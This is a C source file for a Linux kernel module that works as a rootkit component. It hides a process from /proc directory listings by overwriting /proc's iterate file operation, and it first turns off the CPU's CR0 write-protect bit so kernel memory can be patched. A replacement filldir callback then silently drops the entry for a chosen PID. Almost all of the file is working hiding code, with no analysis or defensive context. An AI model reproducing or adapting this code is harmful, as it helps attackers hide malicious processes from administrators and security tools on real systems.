# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
// filp_open, filp_close, struct file, struct dir_context.
# include <linux/fs.h>
# endif // CPP

MODULE_LICENSE("GPL");

# define ROOT_PATH "/proc"
# define SECRET_PROC 1

# define set_file_op(op, path, new, old)                            \
    do {                                                            \
        struct file *filp;                                          \
        struct file_operations *f_op;                               \
                                                                    \
        fm_alert("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            fm_alert("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            fm_alert("Succeeded in opening: %s\n", path);           \
            f_op = (struct file_operations *)filp->f_op;            \
            old = f_op->op;                                         \
                                                                    \
            fm_alert("Changing file_op->" #op " from %p to %p.\n",  \
                     old, new);                                     \
            disable_wp();                                           \
            f_op->op = new;                                         \
            enable_wp();                                            \
        }                                                           \
    } while (0)

# define fm_alert(fmt, ...)                             \
    fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)
# define fm_printk(level, fmt, ...)                     \
    printk(level "%s.%s: " fmt,                         \
           THIS_MODULE->name, __func__, ##__VA_ARGS__)

int
(*real_iterate)(struct file *filp, struct dir_context *ctx);
int
(*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);

int
fake_iterate(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);

void disable_wp(void);
void enable_wp(void);

int
init_module(void)
{
    fm_alert("%s\n", "init module()");

    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);

    if (!real_iterate) {
        return -ENOENT;
    }

    return 0;
}


void
cleanup_module(void)
{
    if (real_iterate) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
    }

    fm_alert("%s\n", "cleanup module()");
    return;
}


int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    if (pid == SECRET_PROC) {
        fm_alert("Hiding pid: %ld", pid);
        return 0;
    }

    /* pr_cont("%s ", name); */

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
void disable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}
void enable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}

